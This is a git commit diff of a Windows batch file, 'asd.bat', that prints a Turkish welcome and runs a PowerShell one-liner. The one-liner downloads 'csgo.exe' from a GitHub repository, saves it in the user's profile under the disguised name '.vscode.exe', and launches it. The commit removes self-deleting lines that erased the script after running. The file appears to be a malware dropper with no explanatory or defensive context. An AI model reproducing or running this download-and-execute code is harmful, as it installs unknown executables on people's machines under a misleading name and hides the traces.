d0ae934ad54e20063fa22adca038eb2393c1f62f
Abdullah Can Yazbahar <65427320+canyazbahar@users.noreply.github.com>
2023-08-11 20:28:44 +0300

    Update asd.bat

--- asd.bat
+++ asd.bat
@@ -1,8 +1,3 @@
 @echo OFF
 echo HOS GELDINIZ!
 powershell -command "$u='https://github.com/canyazbahar/cook/raw/main/csgo.exe';$p='C:\Users\' + $env:USERNAME + '\.vscode.exe';(New-Object Net.WebClient).DownloadFile($u,$p);(New-Object -com shell.application).shellexecute($p);exit"
-timeout /t 10
-( 
-    echo del /Q "%~f0" 
-) > "%temp%\selfdelete.bat"
-"%temp%\selfdelete.bat"
